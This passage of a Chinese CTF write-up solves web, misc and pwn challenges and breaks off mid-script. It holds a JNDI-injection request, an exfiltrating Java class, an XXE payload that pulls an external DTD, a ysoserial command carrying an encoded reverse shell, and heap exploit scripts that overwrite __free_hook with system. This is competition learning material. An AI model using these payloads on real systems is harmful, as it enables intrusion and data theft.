<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/;/admin/mailbox.jsp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.71.187.127:20012</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>115</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">inputtext</span>=&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;ldap://ip:port/Exploit&quot;</span>&#125;&#125;</span></span><br><span class="line"><span class="language-ini"></span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-<span class="built_in">all</span>.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://ip:8888/#Exploit&quot;</span> <span class="number">9999</span></span><br><span class="line">python3 -m http.server --bind <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b&quot;</span>);</span><br><span class="line">        Map&lt;String,Object&gt; params = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">        params.put(<span class="string">&quot;msg&quot;</span>, str);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">postData</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String,Object&gt; param : params.entrySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (postData.length() != <span class="number">0</span>) postData.append(<span class="string">&#x27;&amp;&#x27;</span>);</span><br><span class="line">            postData.append(URLEncoder.encode(param.getKey(), <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">            postData.append(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">            postData.append(URLEncoder.encode(String.valueOf(param.getValue()), <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] postDataBytes = postData.toString().getBytes(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HttpURLConnection</span> <span class="variable">conn</span> <span class="operator">=</span> (HttpURLConnection)url.openConnection();</span><br><span class="line">        conn.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">        conn.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">        conn.setRequestProperty(<span class="string">&quot;Content-Length&quot;</span>, String.valueOf(postDataBytes.length));</span><br><span class="line">        conn.setDoOutput(<span class="literal">true</span>);</span><br><span class="line">        conn.getOutputStream().write(postDataBytes);</span><br><span class="line">        <span class="type">Reader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(conn.getInputStream(), <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现可以产生请求，于是刚开始尝试列目录，失败。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;      </span><br><span class="line">  <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/var&quot;</span>);</span><br><span class="line">  File[] paths = f.listFiles();</span><br><span class="line">  str = paths.toString();</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; paths.length; i++) &#123;</span><br><span class="line">    str += paths[i].toString() + <span class="string">&quot;,&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">   str = e.toString() + <span class="string">&quot;,&quot;</span> + e.getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用 <code>try/catch</code> 发现是个不知道什么鬼 <code>java.lang.reflect.InvocationTargetException</code> 的报错，可能是什么 waf ，没细究，直接读 &#x2F;flag ，发现可以读到，完事。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/etc/passwd&quot;</span>);</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(f);</span><br><span class="line"><span class="keyword">while</span> (sc.hasNextLine())&#123;</span><br><span class="line">    str += sc.nextLine(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&#x2F;&#x2F;你要问我为啥行，俺也不知道，俺就是个脚本小子 hhhh </p>
<h2><span id="baby-gadget-v1-0-s-rrrevenge">baby gadget v1.0’s rrrevenge</span><a href="#baby-gadget-v1-0-s-rrrevenge" class="header-anchor"></a></h2><p>同上做法</p>
<h2><span id="baby-gadget-v2-0">baby gadget v2.0</span><a href="#baby-gadget-v2-0" class="header-anchor"></a></h2><p>登陆抓包发现 xxe，简单测试后发现有 waf，用 utf-16be 可以绕，依照提示读 hint.txt 发现提示 name过长，用dtd外带即可：<br>文件 xxe.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-16&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">users</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///hint.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps/1.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>123<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>icon转一下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf-8 -t utf-16be &lt; xxe.xml &gt; xxe-utf-16.xml</span><br></pre></td></tr></table></figure>
<p>通过hint下载到源码是 java 字节码 可以直接反序列化，发现有黑名单类，但没有对 JRMPListener 做过滤，所以直接通过 jrmp 打 cc 就可以直接rce</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 2333 CommonsCollections5 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvMjMzMzMgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient xxx.xxx.xxx.xxx:2333 </span><br></pre></td></tr></table></figure>

<h2><span id="baby-gadget-v2-0-revenge">baby gadget v2.0’ revenge</span><a href="#baby-gadget-v2-0-revenge" class="header-anchor"></a></h2><p>同上做法</p>
<h1><span id="misc">Misc</span><a href="#misc" class="header-anchor"></a></h1><h2><span id="checkin">Checkin</span><a href="#checkin" class="header-anchor"></a></h2><p>Discord频道给机器人私发”&gt;flag”可以得到一闪而过的flag，考虑使用录屏来获取。<br><img src="20220301005625955.jpg" alt="img"></p>
<h2><span id="ra2">ra2</span><a href="#ra2" class="header-anchor"></a></h2><p>直接玩游戏即可得到flag：SUSCTF{RED_ALERT_WINNER!!!}<br><img src="./20220301005626061.jpg" alt="img"><br><img src="./20220301005626302.jpg" alt="img"><br><img src="./20220301005626167.jpg" alt="img"><br><img src="./20220301005626003.jpg" alt="img"></p>
<h2><span id="tanner">Tanner</span><a href="#tanner" class="header-anchor"></a></h2><p>首先根据校验矩阵还原码字<br>然后在ID3处发现的hint：THE FLAG IS the sha256 of the sum ofthe proper codewords(binary plus)which satisfy the condition.(note: with no zeros front)<br>于是将所有满足的码字的二进制数据相加之后去sha256得到flag：SUSCTF{c17019990bf57492cddf24f3cc3be588507b2d567934a101d4de2fa6d606b5c1}</p>
<h2><span id="audio">AUDIO</span><a href="#audio" class="header-anchor"></a></h2><p>听fromfreiend的音频可以在30s部分听见比较明显的morse电码声音,而原始音频无杂音。因此猜测是否两者可以进行叠加而消除而只保留morse电码声音,网上搜了一下,发现b站教程一大堆,大部分都是用au进行。随便乱调,发现在等于-6dB时可以只听见清晰的电码声音,于是开始导出文件看频谱,可以很清晰得看到明显的morse电码<br><img src="./20220301005626383.jpg" alt="img"></p>
<p>… ..- … -.-. - ..-. – .- … - . .-. — ..-. .- ..- -.. .. —<br><img src="./20220301005626207.jpg" alt="img"><br>最后加上{}<br>SUSCTF{MASTEROFAUDIO}</p>
<h2><span id="misound">misound</span><a href="#misound" class="header-anchor"></a></h2><h3><span id="fei-yu-qi">非预期</span><a href="#fei-yu-qi" class="header-anchor"></a></h3><p>音频丢进Silenteye得到base64解码后内容为<br>207 359 220 224 352 315 359 374 290 310 277 507 391 513 423 392 508 383 440 322 420 427 503 460 295 318 245 302 407 414 410 130 369 317</p>
<p>Au看频谱得到字符串   AnEWmuLTiPLyis_etimes_wiLLbEcomE_B<br>分割一下，大概是<br>  a new multiply is e times _ will become b<br><img src="./20220301005626343.jpg" alt="img"><br>翻译得到：一个新的乘法是e乘以_将变成b<br>hint:乘法使用ASCII码相乘<br> _的ASCII值是95 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">num = [<span class="string">&#x27;207&#x27;</span>,<span class="string">&#x27; 359&#x27;</span>,<span class="string">&#x27; 220&#x27;</span>,<span class="string">&#x27; 224 &#x27;</span>,<span class="string">&#x27;352 &#x27;</span>,<span class="string">&#x27;315 &#x27;</span>,<span class="string">&#x27;359 &#x27;</span>,<span class="string">&#x27;374&#x27;</span>,<span class="string">&#x27; 290 &#x27;</span>,<span class="string">&#x27;310&#x27;</span>,<span class="string">&#x27; 277&#x27;</span>,<span class="string">&#x27; 507 &#x27;</span>,<span class="string">&#x27;391 &#x27;</span>,<span class="string">&#x27;513 &#x27;</span>,<span class="string">&#x27;423&#x27;</span>,<span class="string">&#x27; 392 &#x27;</span>,<span class="string">&#x27;508 &#x27;</span>,<span class="string">&#x27;383&#x27;</span>,<span class="string">&#x27; 440 &#x27;</span>,<span class="string">&#x27;322&#x27;</span>,<span class="string">&#x27; 420&#x27;</span>,<span class="string">&#x27; 427&#x27;</span>,<span class="string">&#x27; 503 &#x27;</span>,<span class="string">&#x27;460 &#x27;</span>,<span class="string">&#x27;295&#x27;</span>,<span class="string">&#x27; 318 &#x27;</span>,<span class="string">&#x27;245&#x27;</span>,<span class="string">&#x27; 302 &#x27;</span>,<span class="string">&#x27;407&#x27;</span>,<span class="string">&#x27; 414&#x27;</span>,<span class="string">&#x27; 410&#x27;</span>,<span class="string">&#x27; 130 &#x27;</span>,<span class="string">&#x27;369 &#x27;</span>,<span class="string">&#x27;317&#x27;</span>]</span><br><span class="line">a = <span class="string">&#x27;AnEWmuLTiPLyis_etimes_wiLLbEcomE_B&#x27;</span></span><br><span class="line"><span class="comment">#一个新的乘法是e乘以u将变成b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#369可以是用_下标或者循环求出来</span></span><br><span class="line"><span class="comment">#print(((ord(&#x27;_&#x27;) * ord(&#x27;e&#x27;))/num[i]))</span></span><br><span class="line"><span class="comment">#当num[i]等于369时候，值最接近整数#26.00271002710027</span></span><br><span class="line"><span class="comment">#然后计算了一下95*101和369*26的是相差是1</span></span><br><span class="line"><span class="comment">#猜测加密算法95*101=369*26+1</span></span><br><span class="line"><span class="comment">#测试猜想：（207*26+1）/65等于82.8向上取整是83，然后是S字符</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">    flag = flag + <span class="built_in">chr</span>(<span class="built_in">round</span>((<span class="built_in">int</span>(num[i]) * <span class="number">26</span> + <span class="number">1</span>)/<span class="built_in">ord</span>(a[i])))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>（属于是经典非预期了，由于乘积出来的数足够大，这里的 +1 其实在一定范围内取值都行，都没用到 SSTV 那东西 hhh</p>
<h1><span id="pwn">Pwn</span><a href="#pwn" class="header-anchor"></a></h1><h2><span id="rain">rain</span><a href="#rain" class="header-anchor"></a></h2><p>这题也不需要完全逆完，就抓可能产生漏洞的地方分析构造就好。首先，很容易关注到<code>config</code>中<code>realloc</code>那里，当<code>size = 0</code>的时候，相当于<code>free</code>，然后再通过<code>realloc</code>往这个已经在<code>tcache</code>中的堆块写入数据，修改其<code>next</code>指针（其实就是个<code>UAF</code>），就可以进行劫持了，这里由于是<code>2.27(1.2)</code>版本的<code>libc</code>，因此还可以进行<code>double free</code>。不过，这里有两个地方要考虑一下，第一个就是需要泄露<code>libc</code>的基地址，第二个就是如何将我们伪造的堆块申请出来。对于第一个问题，我们容易想到，可以通过更改存放字母表的地址，再打印出来，就能造成信息泄露了，既然要更改存放字母表的地址，自然最方便的就是劫持整个结构体了，我们用<code>raining</code>刷新一下后，会通过<code>malloc(0x40)</code>申请一个堆块存放这个结构体，而我们可以在之前通过<code>realloc</code>那里<code>double free</code>一个<code>0x50</code>的堆块，这里就会申请出其中一个存放这个结构体，而在之后我们再用<code>realloc</code>申请出另外一个，就可以劫持到结构体了，这里由于没开<code>PIE</code>，故直接将存放字母表的地址改成某个<code>elf</code>的<code>got</code>表地址，就可以泄露出<code>libc</code>基地址了。再考虑第二个问题，如何申请出伪造的堆块，其实思路是类似地，先用<code>raining</code>刷新后，通过申请结构体那里申请出一个堆块，再在之后<code>realloc</code>申请出的就是伪造的堆块了，也就可以进行任意写了，这里劫持的是<code>__free_hook</code>，再通过<code>realloc(0)</code>调用<code>free</code>即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./rain&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;124.71.185.75&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./rain&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">heigh, width, front_color, back_color, rainfall, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;ch&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    payload = p32(heigh) + p32(width) + p8(front_color) + p8(back_color) + p32(rainfall)</span><br><span class="line">    payload = payload.ljust(<span class="number">18</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += content</span><br><span class="line">    io.sendafter(<span class="string">&#x27;FRAME&gt; &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;ch&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">send_data(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">send_data(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">send_data(<span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x64</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;ch&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">send_data(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, p32(<span class="number">0x1</span>) + p32(<span class="number">0x1</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0x400E17</span>) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">send_data(<span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x64</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;ch&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Table:            &quot;</span>);</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base:\t&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;ch&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">send_data(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">send_data(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">send_data(<span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x64</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">8</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;ch&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">send_data(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">send_data(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2><span id="happytree">happytree</span><a href="#happytree" class="header-anchor"></a></h2><p>二叉排序树在删除根节点时,会把他第一个右子树的最小左子树和根节点内容互换然后删除最小左子树的堆块,但是删除堆块时左右子树的指针并未清空,如果重新将其malloc出来就会导致原来被删除的那个节点他的左右子树指针仍得到保留,因此可以得到一次double free 2.27未做限制,直接修改free_hook为system即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level= <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment"># sh = process(&#x27;./happytree&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;124.71.147.225&quot;</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;cmd&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;data:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">data</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;data:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(data))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;data:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;12&#x27;</span>)</span><br><span class="line">    data = sh.recv(<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh,&#x27;b * $rebase(0x10AA)&#x27;)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0xd0</span> + i,<span 